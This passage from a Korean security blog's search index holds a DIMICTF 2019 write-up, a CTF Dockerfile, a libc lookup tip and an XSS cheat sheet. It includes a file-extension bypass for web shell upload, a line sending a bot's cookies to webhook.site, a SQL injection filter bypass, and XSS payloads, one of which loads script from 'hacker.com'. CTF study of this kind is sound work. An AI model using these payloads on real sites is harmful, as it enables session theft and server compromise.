            <tag> Pwn, ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DIMICTF 2019 Write up</title>
      <link href="2020/02/06/dimictf-200206/"/>
      <url>2020/02/06/dimictf-200206/</url>
      
        <content type="html"><![CDATA[<h3 id="1-web-5shared"><a href="#1-web-5shared" class="headerlink" title="1. web(5shared)"></a>1. web(5shared)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$session</span> = md5(session_id());</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="keyword">__DIR__</span> . <span class="string">&quot;/~uploads/<span class="subst">&#123;$session&#125;</span>/&quot;</span>;</span><br><span class="line"></span><br><span class="line">createDirectory(<span class="keyword">__DIR__</span> . <span class="string">&quot;/~uploads/&quot;</span>);</span><br><span class="line">createDirectory(<span class="variable">$uploaddir</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r($_FILES[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line"><span class="variable">$extension</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$extension</span>, <span class="keyword">Array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;png&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the real sanity check</span></span><br><span class="line"><span class="variable">$real_extension</span> = array_pop(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">4096</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;최대 4mb까지 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;성공적으로 파일이 업로드되었습니다.&#x27;); location.href = &#x27;/&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;업로드 에러&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sanity check</span></span><br><span class="line"><span class="variable">$extension</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$extension</span>, <span class="keyword">Array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;png&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the real sanity check</span></span><br><span class="line"><span class="variable">$real_extension</span> = array_pop(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다.</p><p>sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,<br>jpg, gif, png 만 허용시켜 둔 상황이다.</p><p>그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다.</p><ol><li>test.jpg</li><li>test.jpg.php<br>jpg 뒤에 확장자를 하나 더 붙여서 실행 파일로 만들어 주면 확장자 검사를 피할 수 있다.<br>근데 아래 real sanity check를 보면 php는 또 불가능 하기 때문에 php 대체 확장자를 써서 우회해주자. (phtml, php5 등)</li></ol><p>upload) test.jpg.phtml<br>위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다.</p><hr><h3 id="2-web-simple-xss"><a href="#2-web-simple-xss" class="headerlink" title="2. (web) simple xss"></a>2. (web) simple xss</h3><p>문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,<br>봇의 쿠키를 탈취하면 된다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">&#x27;https://webhook.site/~&#x27;</span>+document.cookie;</span><br></pre></td></tr></table></figure><hr><h3 id="3-web-simple-sqli"><a href="#3-web-simple-sqli" class="headerlink" title="3. (web) simple sqli"></a>3. (web) simple sqli</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//error_reporting(E_ALL); </span></span><br><span class="line"><span class="comment">//ini_set(&quot;display_errors&quot;, 1); </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;lib.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view-source&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line"><span class="variable">$pw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($conn); </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/information|admin|or|\=| |\#|\&#x27;|_|where/i&quot;</span>, <span class="variable">$id</span> . <span class="variable">$pw</span>)) </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$id</span>, <span class="variable">$pw</span>)) &#123; </span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `users` WHERE `id` = trim(&#x27;<span class="subst">&#123;$id&#125;</span>&#x27;) AND `pw` = trim(&#x27;<span class="subst">&#123;$pw&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysqli_fetch_array(mysqli_query(<span class="variable">$conn</span>, <span class="variable">$query</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;<span class="subst">&#123;$flag&#125;</span>&lt;/h1&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) &#123; </span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;<span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>님 안녕하세요!&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>페이지 로그인 코드는 다음과 같다.<br>$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다.</p><p>이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span>\<span class="operator">&amp;</span>pw<span class="operator">=</span>)<span class="operator">||</span> id <span class="keyword">like</span> &quot;ad&quot; &quot;min&quot;<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF, Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Web Challenge(Dockerfile)</title>
      <link href="2020/02/05/dockerfile-200205/"/>
      <url>2020/02/05/dockerfile-200205/</url>
      
        <content type="html"><![CDATA[<p>간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND=noninteractive</span><br><span class="line">ENV TERM=linux</span><br><span class="line"></span><br><span class="line">RUN apt-get update -y</span><br><span class="line">RUN apt-get install apache2 -y</span><br><span class="line">RUN apt-get install libapache2-mod-php -y</span><br><span class="line">RUN apt-get install php -y</span><br><span class="line">RUN apt-get install vim -y</span><br><span class="line"></span><br><span class="line">COPY ./files /var/www/html</span><br><span class="line">RUN rm -rf /var/www/html/index.html</span><br><span class="line">EXPOSE 포트번호</span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;/usr/sbin/apache2ctl&quot;</span>, <span class="string">&quot;-D&quot;</span>, <span class="string">&quot;FOREGROUND&quot;</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dockerfile, Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libc database search(bluekat)</title>
      <link href="2020/02/05/pwnbluekat-200205/"/>
      <url>2020/02/05/pwnbluekat-200205/</url>
      
        <content type="html"><![CDATA[<p>예전에 포너블 공부할 때 rop 문제에서 오프셋 기반으로<br>립씨 버전 하나하나 찾으려니 솔직히 너무 귀찮았다..</p><p>그래서 찾아보다가 libc bluekat 이라는 사이트를 찾았는데,<br>함수 오프셋을 통해서 일치하는 libc 버전을 간단하게 찾아 주었다!</p><p>포너블 하신다면 자주 이용해먹으면 좋을 것 같다.</p><p>[<a href="https://libc.blukat.me]">https://libc.blukat.me]</a>(libc-bluekat homepage)</p>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss cheatsheet 2020</title>
      <link href="2020/02/05/xsscheatsheet-200205/"/>
      <url>2020/02/05/xsscheatsheet-200205/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;hacker.com/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>cilck me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onunload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> data:text/html,<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> */alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>/*</span><br><span class="line"><span class="javascript"> <span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="string">&#x27;alert(/xss/)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web, XSS, CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
